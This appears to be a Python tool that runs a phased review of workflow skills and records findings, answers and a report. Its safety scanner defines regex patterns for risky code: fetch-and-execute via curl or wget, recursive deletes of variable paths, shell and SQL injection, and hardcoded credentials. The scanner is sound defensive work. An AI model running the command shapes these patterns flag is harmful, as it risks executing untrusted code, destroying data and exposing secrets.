#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Clearlane
"""Coordinator for reviewing a workflow skill.

Review phases follow the surfaces the reviewed skill actually exposes, so a
skill with no settings never walks a settings review. The surface vocabulary is
imported from the design coordinator rather than restated, so a capability can
never be designable but unreviewable. Findings, dispositions, and phase notes
persist in a run directory, and the verdict is gated on every blocking finding
carrying an explicit disposition.
"""

import argparse
import json
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import document
import names
from cli import (
    EX_DATAERR,
    EX_USAGE,
    fail,
)
from design import CAPABILITY_PHASES
from state import (
    VERSION,
    create_run,
    excluded,
    now,
    open_run,
    pending_phase,
    phase_complete_event,
    read_artifact,
    read_history,
    read_json,
    read_status,
    relative_file_manifest,
    require_text,
    run_cli,
    save_state,
    slug,
    tree_sha256,
    validate_sarif,
    write_artifact,
    write_json,
)
from state import (
    print_status as print_envelope,
)
from validate import validate as validate_skill

# Review concerns every skill has, regardless of which surfaces it exposes.
ALWAYS_FIRST = ("activation", "structure")
ALWAYS_LAST = ("safety", "verdict")

# SARIF 2.1.0 has three result levels. Ours map onto them without loss: a
# reviewer's "this blocks the merge" is a scanner's "error".
SARIF_LEVELS = {"blocking": "error", "major": "warning", "minor": "note"}
SARIF_SCHEMA = "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json"
# Identifies which tool produced a result once the file has left this run
# directory, and gives each rule a page explaining what it checks.
TOOL_NAME = "designing-workflow-skills review"
HELP_BASE = "https://github.com/clearlane/workflow-skills/blob/main"
PHASE_RESOURCES = {
    "activation": "references/structure.md",
    "structure": "references/naming.md",
    "safety": "references/patterns.md#6-safety-gate",
    "verdict": "references/review.md",
}

# Surfaces mirror the design coordinator's capabilities: whatever can be
# designed must be reviewable against the same contract.
SURFACES = tuple(name for name, _, _ in CAPABILITY_PHASES)
SURFACE_RESOURCES = {name: resource for name, _, resource in CAPABILITY_PHASES}

# Detection signals. A surface is claimed only with recorded file evidence, so
# the phase list argues from the reviewed skill rather than from a checklist.
SURFACE_KEYWORDS = {
    "coordinator": ("coordinator", "pipeline(", "phase("),
    "state": ("state.json", "resume", "checkpoint"),
    "settings": ("settings", "preference"),
    "setup": ("pre-flight", "preflight", "prerequisite"),
    "install": ("install",),
    "events": ("lifecycle", "event handler", "hook"),
    "tools": ("mcp", "external service", "external tool"),
    "workers": ("worker", "delegate", "subagent"),
    "commands": ("command entrypoint", "slash command", "invocation"),
    "packaging": ("bundle", "manifest", "marketplace"),
}
TEXT_SUFFIXES = {".md", ".py", ".js", ".mjs", ".ts", ".sh", ".json", ".yaml", ".yml", ".toml"}
MAX_EVIDENCE = 5
MAX_BYTES = 2_000_000

SEVERITIES = ("blocking", "major", "minor")
DISPOSITIONS = ("fixed", "accepted", "deferred")
# `not-applicable` is a real answer, not an escape hatch: a skill with no
# destructive action genuinely cannot gate one. It still costs evidence, so
# the claim that the case does not arise is on the record and checkable.
VERDICTS = ("holds", "violated", "not-applicable")

# The contract every phase is reviewed against. Its questions are parsed rather
# than restated here, because a copy is a second place to change and the
# failure mode is silent: prose gains a question, the coordinator keeps gating
# on the old list, and the run reports full coverage of a contract it no longer
# matches.
REVIEW_CONTRACT = Path(__file__).resolve().parent.parent / "references" / "review.md"


def parse_questions(text=None):
    """Extract each phase's review questions from the contract document.

    Returns a mapping of phase name to the questions that phase must answer.
    Only interrogative bullets count: the contract also uses bullets for the
    disposition vocabulary and the evidence ranking, which are statements, and
    treating those as questions would demand answers to things that ask
    nothing.

    Surface phases share one list, and `coordinator` and `state` carry a
    second, exactly as the document says. That is read off the two bullet
    lists under the surface heading rather than hardcoded, so adding a question
    to either is a documentation edit the gate picks up.

    Markdown is parsed by `document.py`, which owns the model for this
    repository. An earlier version sliced the text by hand and had to decide
    for itself what separated two lists, which is CommonMark's job.
    """
    parsed = document.parse(REVIEW_CONTRACT, text)

    def asked(items):
        return [item for item in items if item.endswith("?")]

    questions = {}
    for heading in parsed.headings_at(3):
        items = asked(item for group in parsed.section_lists(heading.text, level=3) for item in group)
        if items:
            questions[heading.text] = items

    blocks = [items for items in (asked(group) for group in parsed.section_lists("Surface Phases")) if items]
    shared = blocks[0] if blocks else []
    delegating = blocks[1] if len(blocks) > 1 else []
    for surface in SURFACES:
        # The two phases that own what every other surface delegates answer for
        # ordering, resumability, and concurrency as well.
        items = shared + (delegating if surface in ("coordinator", "state") else [])
        if items:
            questions[surface] = items
    return questions


def phase_questions(phase, contract=None):
    """Return `(id, text)` for each question the phase must answer."""
    asked = parse_questions(contract).get(phase, [])
    return [(f"{phase}.{index}", text) for index, text in enumerate(asked, start=1)]


# Which contract question each automatic finding already answers, keyed by the
# finding's source. Anchored on a distinctive phrase rather than an index, so
# reordering the prose cannot silently remap an answer onto a different
# question; `check.py` fails when an anchor stops resolving.
ANSWER_ANCHORS = {
    "conformance:description": ("activation", "observable user intent"),
    "conformance:name": ("activation", "observable user intent"),
    "conformance:frontmatter": ("activation", "observable user intent"),
    "conformance:size": ("structure", "size stay within budget"),
    "conformance:links": ("structure", "every resource reachable"),
    "structure:unreachable": ("structure", "every resource reachable"),
    "structure:naming": ("structure", "filenames follow"),
    "safety-scan": ("safety", "no raw shell interpolation"),
}

# `structure` fires only for a directory holding no SKILL.md, which `init`
# refuses before a run exists, so it can never reach findings.json. Anchoring
# it would state a mapping nothing can exercise; naming it here instead keeps
# the coverage check honest about why it is absent.
UNREACHABLE_RULES = {"conformance:structure"}


def anchored_question(source, contract=None):
    """Resolve a finding source to the question id it answers, if any."""
    anchor = ANSWER_ANCHORS.get(source)
    if anchor is None:
        return None
    phase, needle = anchor
    for identifier, text in phase_questions(phase, contract):
        if needle in text:
            return identifier
    raise AssertionError(f"anchor {needle!r} no longer matches any {phase} question")


def derive_phases(surfaces):
    """Return only the review phases this skill's own surfaces require."""
    selected = list(ALWAYS_FIRST)
    selected.extend(name for name in SURFACES if name in surfaces)
    selected.extend(ALWAYS_LAST)
    return selected


def phase_resource(phase):
    return SURFACE_RESOURCES.get(phase) or PHASE_RESOURCES[phase]


def detect_surfaces(skill_root):
    """Collect bounded file evidence for each surface the skill may expose."""
    evidence = {name: [] for name in SURFACES}
    for path in sorted(skill_root.rglob("*")):
        relative = path.relative_to(skill_root)
        if not path.is_file() or excluded(relative.parts):
            continue
        if path.suffix.lower() not in TEXT_SUFFIXES or path.stat().st_size > MAX_BYTES:
            continue
        stem = path.stem.lower()
        try:
            lines = path.read_text(errors="replace").splitlines()
        except OSError:
            continue
        for name in SURFACES:
            hits = evidence[name]
            if len(hits) >= MAX_EVIDENCE:
                continue
            if stem == name:
                hits.append({"path": relative.as_posix(), "line": 0, "signal": "filename"})
                continue
            for number, line in enumerate(lines, 1):
                lowered = line.lower()
                match = next((word for word in SURFACE_KEYWORDS[name] if word in lowered), None)
                if match:
                    hits.append({"path": relative.as_posix(), "line": number, "signal": match})
                    break
    return evidence


def load_findings(root):
    path = root / "findings.json"
    if not path.exists():
        return []
    return read_artifact(path, "findings.schema.json").get("findings", [])


def save_findings(root, findings):
    write_artifact(root / "findings.json", "findings.schema.json", {"findings": findings})


def unresolved_blocking(findings):
    return [item["id"] for item in findings if item["severity"] == "blocking" and not item["disposition"]]


def load_answers(root):
    path = root / "answers.json"
    if not path.exists():
        return {}
    return read_artifact(path, "answers.schema.json").get("answers", {})


def save_answers(root, answers):
    write_artifact(root / "answers.json", "answers.schema.json", {"answers": answers})


def answered_by_findings(findings):
    """Question ids a seeded finding already settles.

    A scan that located a defect has answered its question in the only way
    that matters: with evidence. Asking the reviewer to retype an answer the
    run already holds is how a gate becomes a formality people click through.
    """
    answered = {}
    for item in findings:
        identifier = anchored_question(item.get("source", ""))
        if identifier:
            answered.setdefault(identifier, item["id"])
    return answered


def outstanding_questions(root, phase, findings=None):
    """Questions this phase must still answer before it can close.

    An id is positional, so editing the contract mid-run can move it onto a
    different question. An answer therefore only settles the question it was
    recorded against: `answers.json` stores the text as asked, and an id whose
    text has since changed is asked again. Without that, reordering two
    questions would silently retarget an answer, and the phase would close
    reporting full coverage over a question nobody was ever shown.
    """
    findings = load_findings(root) if findings is None else findings
    # Keyed by id and text together. The schema requires an answer to record
    # the question it was given, so there is no answer without one to compare.
    settled = set(answered_by_findings(findings))
    asked_as = {(identifier, answer["question"]) for identifier, answer in load_answers(root).items()}
    return [
        (identifier, text)
        for identifier, text in phase_questions(phase)
        if identifier not in settled and (identifier, text) not in asked_as
    ]


def print_status(root, state):
    phase = pending_phase(state)
    findings = load_findings(root)
    blocking = unresolved_blocking(findings)
    outstanding = outstanding_questions(root, phase, findings) if phase else []
    if phase == "verdict" and blocking:
        action = "Resolve blocking findings before the verdict: " + ", ".join(blocking) + " (use resolve-finding)."
    elif outstanding:
        # Naming the next question, rather than only the phase, means the gate
        # tells the agent what it is waiting for. A gate that refuses without
        # saying what would satisfy it gets worked around instead of answered.
        action = (
            f"Answer the open '{phase}' questions against {phase_resource(phase)}: "
            + "; ".join(f"{identifier} {text}" for identifier, text in outstanding)
            + " (use answer, then complete-phase)."
        )
    elif phase:
        action = (
            f"Review '{phase}' against {phase_resource(phase)}, record findings, then run "
            f"complete-phase --phase {phase} with a decision note."
        )
    else:
        action = f"Review complete. Report written to {root / 'report.md'}."
    print_envelope(
        "review",
        root,
        phase,
        state["phases"],
        state["completed"],
        phase_resource(phase) if phase else None,
        action,
        {
            "skill": state["skill"],
            "surfaces": state["surfaces"],
            "findings": {"total": len(findings), "blocking_unresolved": blocking},
            "questions": {
                "open": [{"id": identifier, "text": text} for identifier, text in outstanding],
                "answered": len(load_answers(root)),
            },
        },
    )


# Shapes the safety phase asks about that a pattern can locate. Each is a lead,
# never a verdict: whether an interpolation is safe depends on where the value
# came from, which only a reader can decide. They are seeded as `major` rather
# than `blocking` for exactly that reason, so the run does not stall on a
# scanner's opinion, and every one names the question it is evidence for.
SAFETY_PATTERNS = (
    (
        # Recursive only. A plain `rm -f "$tmp"` removes one named file and is
        # the ordinary spelling of a cleanup trap, so flagging it buried the
        # recursive case that actually loses a tree. An unquoted variable is
        # included whether recursive or not, since word splitting turns one
        # path into several.
        re.compile(r"\brm\s+(?:-[a-z]*\s+)*-?[a-z]*r[a-z]*\s+[\"']?\$|\brm\s+(?:-[a-z]+\s+)*\$[A-Za-z_{]"),
        "deletes recursively, or without quoting, a path built from a variable",
        "quote and validate the path before deleting, or confine the delete to a restorable snapshot",
    ),
    (
        re.compile(r"\b(?:eval|sh|bash)\b[^\n]*\$\((?:\s*)?(?:curl|wget)\b"),
        "executes code fetched at runtime",
        "pin and verify what is fetched, or install it as a declared dependency instead",
    ),
    (
        # Anchored on SQL grammar, not on the bare verb: `agents update --id
        # "$X"` is a CLI invocation, and matching it made every command line
        # carrying the word "update" a database finding.
        re.compile(
            r"\b(?:SELECT\b[^\n]*\bFROM\b|INSERT\s+INTO\b|UPDATE\b[^\n]*\bSET\b|DELETE\s+FROM\b)"
            r"[^\n]*(?:'\s*\$|\"\s*\$|\$\{|%s\s*%|\+\s*\w+)",
            re.IGNORECASE,
        ),
        "builds a query by interpolating a value",
        "pass the value as a bound parameter rather than concatenating it into the statement",
    ),
    (
        re.compile(
            r"\b(?:api[_-]?key|secret|token|password|passwd)\b\s*[:=]\s*[\"']?[A-Za-z0-9_\-]{16,}",
            re.IGNORECASE,
        ),
        "looks like a literal credential",
        "read the secret from the environment or a secret store, and rotate this one if it is real",
    ),
    # The four patterns above are shell-shaped, so they see a dangerous command
    # only when it is written in shell. The same command built in Python or
    # JavaScript and handed to a shell was invisible: `os.system("rm -rf " +
    # target)` matched nothing, which is the exact line the safety phase exists
    # to find. These read the language-level spelling of the same act.
    (
        # A literal argument is fine; the finding is the interpolation.
        re.compile(r"\bos\.(?:system|popen)\s*\(\s*(?:[\"'][^\"']*[\"']\s*(?:\+|%)|f[\"']|[A-Za-z_])"),
        "builds a shell command from a value and runs it",
        "pass an argument list to subprocess.run without a shell, or validate and quote the value first",
    ),
    (
        # shell=True is only a finding when the command on that line is built
        # rather than literal, since a fixed string carries nothing to inject.
        re.compile(
            r"(?:f[\"'][^\"']*\{|[\"'][^\"']*[\"']\s*\+|%\s*[A-Za-z_(])[^\n]*shell\s*=\s*True"
            r"|shell\s*=\s*True[^\n]*(?:f[\"'][^\"']*\{|[\"'][^\"']*[\"']\s*\+)"
        ),
        "runs an interpolated command through a shell",
        "drop shell=True and pass an argument list, so the value cannot be read as syntax",
    ),
    (
        re.compile(r"\b(?:exec|execSync)\s*\(\s*(?:`[^`]*\$\{|[\"'][^\"']*[\"']\s*\+|[A-Za-z_$][\w$]*\s*\+)"),
        "builds a shell command from a value and runs it",
        "use execFile or spawn with an argument array, or escape the value for the shell",
    ),
    (
        # A bare name as the whole argument. `exec(compile(...))` and a
        # commented line are excluded, since a call and a mention differ.
        re.compile(r"(?<![\w.])(?:eval|exec)\s*\(\s*[A-Za-z_$][\w$]*\s*[,)]"),
        "evaluates a value as code",
        "parse the value with a format that carries no execution, such as json",
    ),
    (
        re.compile(r"\bshutil\.rmtree\s*\(\s*(?![\"'])[A-Za-z_]"),
        "deletes a tree at a path held in a variable",
        "confine the delete to a path the code created, or take a restorable snapshot first",
    ),
)


def safety_findings(skill_root):
    """Locate the safety questions a pattern can find, as leads to settle.

    The safety phase asks whether external input reaches a shell unvalidated
    and whether secrets stay out of the tree. A reviewer answers those by
    reading, and a reviewer who does not read carefully answers them by
    assuming. Pointing at the lines first means the reading starts somewhere
    specific, which is the same reason the format checks are seeded.

    Deliberately not a security scanner. It reports shapes, and a shape is not
    a defect: a recursive delete of a quoted snapshot path, inside the
    coordinator that created that snapshot, is correct. Recorded as `major`, so
    it must be dispositioned and argued with rather than silently inherited as
    a blocking obligation.
    """
    findings = []
    for path in sorted(skill_root.rglob("*")):
        relative = path.relative_to(skill_root)
        if not path.is_file() or excluded(relative.parts):
            continue
        if path.suffix.lower() not in TEXT_SUFFIXES or path.stat().st_size > MAX_BYTES:
            continue
        try:
            lines = path.read_text(errors="replace").splitlines()
        except OSError:
            continue
        for number, line in enumerate(lines, 1):
            # A commented line is a description of code, not code. Reporting
            # one sends a reviewer to read a sentence about a risk instead of
            # the risk, and the most common such sentence is the note left
            # where someone already decided against the dangerous call.
            if line.lstrip().startswith(("#", "//")):
                continue
            for pattern, summary, remedy in SAFETY_PATTERNS:
                if not pattern.search(line):
                    continue
                findings.append(
                    {
                        "phase": "safety",
                        "severity": "major",
                        "summary": f"{relative.as_posix()}:{number} {summary}",
                        "evidence": f"{relative.as_posix()}:{number}",
                        "remedy": remedy,
                        "disposition": None,
                        "disposition_note": None,
                        "source": "safety-scan",
                        "recorded_at": now(),
                    }
                )
                break
    return findings


# Directories whose prose is a resource an agent is meant to reach. Executables
# and data are excluded on purpose: a script is reached by being run, not by
# being named, so reporting it unreferenced would be noise. Naming is checked
# across the whole tree by names.py, which owns that rule.
RESOURCE_DIRS = frozenset(
    {"references", "reference", "workflows", "docs", "doc", "guides", "lib", "commands", "agents"}
)


def naming_findings(skill_root):
    """Flag filenames outside the one-word or family-first convention.

    `references/naming.md` states the rule and a reviewer was left to apply
    it by eye across every file in the tree, which is the kind of uniform
    mechanical sweep attention is worst at: one `SCREAMING_CASE.md` among
    thirty conforming names reads as unremarkable.

    scripts/names.py owns the rule, including the PEP 8 carve-out for
    importable modules and the ecosystem names that outrank the convention, and
    self-checks nineteen cases against it. This used to restate a subset of
    that: a stem pattern, a stem allowlist, and `*.md` under four directory
    names. The subset was the problem. A skill keeping its resources in `lib/`
    or its executables in `bin/` was not partially checked but entirely
    unchecked, and a `HelperUtils.md` there passed while the same file one
    directory over failed. Two implementations of one rule also drift, and the
    one being maintained was not this one.
    """
    findings = []
    for relative, error in names.validate(skill_root):
        if excluded(relative.parts):
            continue
        findings.append(
            {
                "phase": "structure",
                "severity": "minor",
                "summary": f"{relative.as_posix()} is outside the filename convention: {error}",
                "evidence": relative.as_posix(),
                "remedy": error,
                "disposition": None,
                "disposition_note": None,
                "source": "structure:naming",
                "recorded_at": now(),
            }
        )
    return findings


def unreachable_findings(skill_root):
    """Name the prose resources nothing else in the skill points at.

    The structure phase asks whether every resource is actually reachable
    from the core instructions. A resource no other file mentions cannot be
    loaded by an agent following the skill: it is shipped weight that reads
    like coverage, and reviewers miss it because absence is what you have to
    notice, and nothing draws the eye to a file that is never named.

    Matches a bare basename anywhere, not a well-formed link, which is
    deliberately generous. A resource listed by name in a README is reachable
    enough for a reader to find, and over-reporting a reachable file trains
    reviewers to skip the whole category. A file naming itself proves nothing
    and is excluded.
    """
    resources = {}
    for path in skill_root.rglob("*.md"):
        relative = path.relative_to(skill_root)
        if not path.is_file() or excluded(relative.parts):
            continue
        if len(relative.parts) > 1 and relative.parts[0] in RESOURCE_DIRS:
            resources[relative.as_posix()] = path
    if not resources:
        return []

    named = set()
    for path in skill_root.rglob("*"):
        relative = path.relative_to(skill_root)
        if not path.is_file() or excluded(relative.parts):
            continue
        if path.suffix.lower() not in TEXT_SUFFIXES or path.stat().st_size > MAX_BYTES:
            continue
        try:
            text = path.read_text(errors="replace")
        except OSError:
            continue
        for key, target in resources.items():
            if target != path and target.name in text:
                named.add(key)

    return [
        {
            "phase": "structure",
            "severity": "major",
            "summary": f"{key} is named by no other file, so nothing can route an agent to it",
            "evidence": key,
            "remedy": "link it from the resource that owns the concern, or delete it if its content lives elsewhere",
            "disposition": None,
            "disposition_note": None,
            "source": "structure:unreachable",
            "recorded_at": now(),
        }
        for key in sorted(resources)
        if key not in named
    ]


def conformance_findings(skill_root):
    """Findings a parser can settle, recorded before any judgement is spent.

    A review used to open with an empty findings file and ask a human every
    question, including the ones with exact answers: a name over 64 characters
    or a link to a file that does not exist is not a matter of opinion, and a
    reviewer who happened not to check left the skill rejected at install time
    with a passing verdict.

    Seeding them at init also fixes the ordering. These are cheap and certain,
    so they belong before the expensive uncertain questions, and a reviewer
    reading `findings.json` first sees what is already known.

    Severity maps by whether the format rejects the skill: an error means a
    host will not load it, which blocks; a warning is guidance an author may
    knowingly accept, which does not.

    The remedy comes from the validator rather than being left for the
    reviewer: record-finding requires one from a human, and a seeded finding
    without it would reach remediate.py as an obligation with no stated fix.
    """
    return [
        {
            "phase": "activation",
            "severity": "blocking" if finding.severity == "error" else "minor",
            "summary": finding.message,
            "evidence": "SKILL.md",
            "remedy": finding.remedy,
            "disposition": None,
            "disposition_note": None,
            "source": f"conformance:{finding.rule}",
            "recorded_at": now(),
        }
        for finding in validate_skill(skill_root)
    ]


def command_init(args):
    skill_root = args.skill.expanduser().resolve()
    if not (skill_root / "SKILL.md").is_file():
        fail(f"Skill must be a directory containing SKILL.md: {skill_root}")
    root = create_run(args.run_dir, (skill_root, "the skill under review"))
    for name in (args.surface or []) + (args.skip_surface or []):
        if name not in SURFACES:
            fail(f"Unknown surface {name!r}; choose from {', '.join(SURFACES)}")
    evidence = detect_surfaces(skill_root)
    detected = [name for name in SURFACES if evidence[name]]
    surfaces = [name for name in detected if name not in (args.skip_surface or [])]
    for name in args.surface or []:
        if name not in surfaces:
            surfaces.append(name)
    surfaces = [name for name in SURFACES if name in surfaces]
    phases = derive_phases(surfaces)
    root.mkdir(parents=True, exist_ok=True)
    write_json(
        root / "inventory.json",
        {
            "skill": str(skill_root),
            "detected": detected,
            "evidence": evidence,
            "forced": args.surface or [],
            "skipped": args.skip_surface or [],
            "recorded_at": now(),
        },
    )
    state = {
        "version": VERSION,
        "skill": {
            "name": slug(args.name or skill_root.name),
            "path": str(skill_root),
            # Which phases this run will even have is derived from the surfaces
            # detected right here, so the skill as it stands now is what the
            # review is a review of. Without recording it, a surface added
            # afterwards is never examined by any phase and still receives the
            # run's verdict.
            "sha256": tree_sha256(relative_file_manifest(skill_root)),
        },
        "surfaces": surfaces,
        "phases": phases,
        "completed": [],
        "created_at": now(),
        "updated_at": now(),
    }
    state["phase"] = phases[0]
    # Written at init so a clean review is a file saying nothing was found,
    # not a missing file. A consumer cannot tell an absent artifact from a
    # review that found nothing, and would have to treat a passing skill as an
    # error, which is the reading remediation hit.
    #
    # Non-empty when the format's own bounds are already broken: those have
    # exact answers, so spending a reviewer's judgement to rediscover them
    # wastes the expensive resource on the cheap question.
    seeded = (
        conformance_findings(skill_root)
        + safety_findings(skill_root)
        + unreachable_findings(skill_root)
        + naming_findings(skill_root)
    )
    for index, finding in enumerate(seeded, start=1):
        finding["id"] = f"F{index}"
    save_findings(root, seeded)
    save_state(root, state, "initialized")
    print_status(root, state)


def command_status(args):
    root, state = open_run(args.run_dir)
    if args.history:
        print(json.dumps(read_history(root), indent=2, sort_keys=True))
        return
    print_status(root, state)


def command_record_finding(args):
    """Findings attach to a reached phase so evidence precedes judgement."""
    root, state = open_run(args.run_dir)
    # A finding cites a path and a line. Both are claims about a specific tree,
    # so recording one against a changed skill files evidence that may no longer
    # be there, under a run whose other findings describe the earlier tree.
    require_unchanged_skill(state)
    phase = pending_phase(state)
    reached = state["completed"] + ([phase] if phase else [])
    if args.phase not in reached:
        fail(f"Phase {args.phase!r} is not reached yet; reached phases: {', '.join(reached)}")
    if args.severity not in SEVERITIES:
        fail(f"Severity must be one of {', '.join(SEVERITIES)}")
    require_text(args.summary, "--summary")
    require_text(args.evidence, "--evidence")
    findings = load_findings(root)
    finding = {
        "id": f"F{len(findings) + 1}",
        "phase": args.phase,
        "severity": args.severity,
        "summary": args.summary,
        "evidence": args.evidence,
        # Optional: a review that names a defect it cannot yet fix is still a
        # review. Recorded when known so the remediation run triages against
        # the reviewer's statement rather than re-deriving one.
        "remedy": args.remedy or None,
        "disposition": None,
        "disposition_note": None,
        "recorded_at": now(),
    }
    findings.append(finding)
    save_findings(root, findings)
    save_state(root, state, f"finding-recorded:{finding['id']}")
    print(json.dumps(finding, indent=2, sort_keys=True))


def command_resolve_finding(args):
    root, state = open_run(args.run_dir)
    # Disposing of a finding is a judgement that the cited evidence no longer
    # blocks, which is only meaningful against the tree the evidence points
    # into. Fixing the skill and then closing the finding in the same run would
    # record the disposition against a tree the review never re-examined.
    require_unchanged_skill(state)
    if args.disposition not in DISPOSITIONS:
        fail(f"Disposition must be one of {', '.join(DISPOSITIONS)}")
    require_text(args.note, "--note")
    findings = load_findings(root)
    for finding in findings:
        if finding["id"] == args.id:
            finding["disposition"] = args.disposition
            finding["disposition_note"] = args.note
            finding["resolved_at"] = now()
            save_findings(root, findings)
            save_state(root, state, f"finding-resolved:{args.id}")
            print(json.dumps(finding, indent=2, sort_keys=True))
            return
    fail(f"Unknown finding id: {args.id}")


def require_unchanged_skill(state):
    """Refuse to record a conclusion about a tree that is no longer the one reviewed.

    A review's phases are derived from the surfaces present at init, so a
    surface that appears later has no phase to examine it and still collects
    the run's verdict. Editing the skill mid-run is a legitimate thing to do,
    which is why this asks for a new run rather than failing the skill: the
    conclusions reached so far were about a tree that no longer exists.
    """
    recorded = (state.get("skill") or {}).get("sha256")
    if not recorded:
        return
    current = tree_sha256(relative_file_manifest(Path(state["skill"]["path"])))
    if current != recorded:
        fail(
            "the skill changed since this review began, so the phases already "
            "closed describe a tree that no longer exists; start a new run",
            EX_DATAERR,
        )


def command_complete_phase(args):
    root, state = open_run(args.run_dir)
    require_unchanged_skill(state)
    expected = pending_phase(state)
    if expected is None:
        fail("All phases already complete")
    if args.phase != expected:
        fail(f"Next phase is {expected!r}, not {args.phase!r}")
    require_text(args.note, "--note")
    findings = load_findings(root)
    blocking = unresolved_blocking(findings)
    if expected == "verdict" and blocking:
        fail(f"Cannot close the verdict with unresolved blocking findings: {', '.join(blocking)}")
    # A phase closed on a note alone reported the same way whether its
    # contract was worked through or skimmed, so coverage was a matter of who
    # was reviewing. Every question the contract asks of this phase is now
    # either answered here or already settled by a finding.
    outstanding = outstanding_questions(root, expected, findings)
    if outstanding:
        listed = "; ".join(f"{identifier} {text}" for identifier, text in outstanding)
        fail(f"Phase {expected!r} has unanswered review questions (use answer): {listed}")
    write_artifact(
        root / "decisions" / f"{expected}.json",
        "decision.schema.json",
        {
            "phase": expected,
            "resource": phase_resource(expected),
            "note": args.note,
            "recorded_at": now(),
        },
    )
    state["completed"].append(expected)
    state["phase"] = pending_phase(state) or "complete"
    save_state(root, state, phase_complete_event(expected))
    if state["phase"] == "complete":
        write_report(root, state, findings)
    print_status(root, state)


def command_answer(args):
    """Settle one contract question with evidence.

    A phase used to close on a single free-text note, so a five-question
    contract was satisfiable by one sentence. Whichever question the reviewer
    happened to think about got answered and the rest were passed over in
    silence, indistinguishable in the record from questions that were asked
    and held.

    `holds` demands evidence exactly as `violated` does. A pass is a claim
    about the skill, and an unevidenced pass is the thing this gate exists to
    stop being cheap.
    """
    root, state = open_run(args.run_dir)
    require_unchanged_skill(state)
    phase = pending_phase(state)
    reached = state["completed"] + ([phase] if phase else [])
    # A question id is `<phase>.<n>`. Splitting before validating would read a
    # bare word as a phase name and hand it to the parser, which is how a typo
    # became a traceback instead of a sentence saying which id was wrong.
    asked_in, _, _ = args.question.partition(".")
    known = dict(phase_questions(asked_in))
    if args.question not in known:
        fail(f"Unknown question id: {args.question}")
    if asked_in not in reached:
        fail(f"Phase {asked_in!r} is not reached yet; reached phases: {', '.join(reached)}")
    if args.verdict not in VERDICTS:
        fail(f"Verdict must be one of {', '.join(VERDICTS)}")
    # Redundant with the schema's `text` type, which also rejects whitespace,
    # and kept for the message: the schema failure names a JSON pointer, this
    # names the flag the caller passed.
    require_text(args.evidence, "--evidence")
    findings = load_findings(root)
    if args.finding and not any(item["id"] == args.finding for item in findings):
        fail(f"Unknown finding id: {args.finding}")
    # A question the reviewer answers `violated` states a defect, and a defect
    # the run does not carry as a finding never reaches the report or the
    # remediation that follows it.
    if args.verdict == "violated" and not args.finding:
        fail("A violated question needs --finding naming the finding that records it")
    answers = load_answers(root)
    answers[args.question] = {
        "question": known[args.question],
        "verdict": args.verdict,
        "evidence": args.evidence,
        "finding": args.finding or None,
        "recorded_at": now(),
    }
    save_answers(root, answers)
    save_state(root, state, f"question-answered:{args.question}")
    print(json.dumps(answers[args.question], indent=2, sort_keys=True))


def command_add_surface(args):
    """Late discovery is normal; extend the phase list without losing findings."""
    root, state = open_run(args.run_dir)
    if args.surface not in SURFACES:
        fail(f"Unknown surface {args.surface!r}")
    if args.surface in state["surfaces"]:
        fail(f"Surface already present: {args.surface}")
    surfaces = [name for name in SURFACES if name in state["surfaces"] + [args.surface]]
    phases = derive_phases(surfaces)
    missing = [phase for phase in state["completed"] if phase not in phases]
    if missing:
        fail(f"Refusing to drop completed phases: {missing}")
    if args.surface in state["completed"]:
        fail(f"Refusing to reopen a completed phase: {args.surface}")
    state["surfaces"] = surfaces
    state["phases"] = phases
    state["phase"] = pending_phase(state) or "complete"
    # Adding a surface is the reviewer stating that the subject is now known to
    # cover more than the run assumed, which is the one moment a changed tree is
    # accounted for rather than ignored. Re-baselining here is what keeps the
    # drift guard from turning the documented recovery into a dead end: without
    # it a skill that gained a coordinator mid-review could be extended and then
    # never closed. The new phase covers the new material, so the conclusions
    # from here are about the tree recorded here.
    skill = dict(state.get("skill") or {})
    if skill.get("sha256"):
        skill["sha256"] = tree_sha256(relative_file_manifest(Path(skill["path"])))
        state["skill"] = skill
    save_state(root, state, f"surface-added:{args.surface}")
    print_status(root, state)


def write_report(root, state, findings):
    counts = {level: sum(1 for item in findings if item["severity"] == level) for level in SEVERITIES}
    answers = load_answers(root)
    asked = [identifier for phase in state["phases"] for identifier, _ in phase_questions(phase)]
    # Counted by asking the gate, rather than by a second rule that agrees with
    # it most of the time. The two had drifted apart: the report matched ids
    # alone, so an answer the gate had rejected as belonging to a question the
    # contract has since moved was still reported as coverage. A report that
    # overstates what a review established is worse than no count at all.
    outstanding = {
        identifier for phase in state["phases"] for identifier, _ in outstanding_questions(root, phase, findings)
    }
    covered = [identifier for identifier in asked if identifier not in outstanding]
    lines = [
        f"# Skill Review: {state['skill']['name']}",
        "",
        f"- Skill: {state['skill']['path']}",
        f"- Surfaces reviewed: {', '.join(state['surfaces']) or 'none'}",
        f"- Phases: {', '.join(state['phases'])}",
        f"- Findings: {counts['blocking']} blocking, {counts['major']} major, {counts['minor']} minor",
        f"- Contract questions answered: {len(covered)}/{len(asked)}",
        "",
        "## Findings",
        "",
    ]
    if findings:
        lines.append("| ID | Phase | Severity | Summary | Evidence | Disposition |")
        lines.append("|---|---|---|---|---|---|")
        for item in findings:
            lines.append(
                "| {id} | {phase} | {severity} | {summary} | {evidence} | {disposition} |".format(
                    disposition=item["disposition"] or "open",
                    **{
                        key: str(item[key]).replace("|", "\\|")
                        for key in ("id", "phase", "severity", "summary", "evidence")
                    },
                )
            )
    else:
        lines.append("No findings recorded.")
    # A reader who was not present cannot tell a question that held from one
    # nobody asked unless the answers are in the report. Listing them is what
    # makes "reviewed" mean something specific rather than a claim about
    # effort.
    lines.extend(["", "## Contract Questions", ""])
    lines.append("| Question | Verdict | Evidence |")
    lines.append("|---|---|---|")
    by_finding = answered_by_findings(findings)
    for identifier in asked:
        answer = answers.get(identifier)
        if answer:
            verdict, evidence = answer["verdict"], answer["evidence"]
        elif identifier in by_finding:
            verdict, evidence = "violated", f"see {by_finding[identifier]}"
        else:
            verdict, evidence = "unanswered", ""
        text = dict(phase_questions(identifier.split(".")[0])).get(identifier, identifier)
        lines.append(f"| {identifier} {text.replace('|', chr(92) + '|')} | {verdict} | {evidence} |")
    lines.extend(["", "## Phase Decisions", ""])
    for phase in state["phases"]:
        decision = read_json(root / "decisions" / f"{phase}.json")
        lines.append(f"- **{phase}** ({decision['resource']}): {decision['note']}")
    (root / "report.md").write_text("\n".join(lines) + "\n")
    write_sarif(root, state, findings)


